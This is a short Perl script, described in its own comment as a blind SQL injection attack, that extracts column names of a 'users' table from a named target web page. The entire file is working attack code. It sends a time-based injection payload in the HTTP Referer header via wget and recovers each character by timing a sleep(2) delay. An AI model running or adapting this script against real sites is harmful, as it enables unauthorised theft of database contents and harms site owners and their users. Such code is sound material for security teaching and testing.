#!/usr/bin/perl

# This script dumps the user table column of the target website's database
# see the demo video of this blind sql injection attack at
# https://www.youtube.com/watch?v=rNzBF1s8byY
#


use Benchmark;
$end=0;
foreach($j=0; $j<9; $j++)
{
   $tend=0;
   print "The $j col in users table is: ";

   foreach($i=1;; $i++)
   {
     foreach(('a'..'z','0'..'9',''))
       {
  	$t0 = Benchmark->new;
        `wget -qO /dev/null target.hkntec.net/foophones/view.php\?id=1 --referer="' union select substr((SELECT  column_name FROM information_schema.columns where table_name='users' limit 1 offset $j),$i,1)='$_' and sleep(2); -- a"`;
  	$t1 = Benchmark->new;
  	$diffs = timediff( $t1, $t0 );
  	$res=@$diffs[0];
  	if ($res > 1 && $_ eq '') {$tend=1;}
  	if ($res > 1) {print $_;last;}
        }

   if ($tend) {last;}
   }
print "\n";
if ($end) {last;}

}



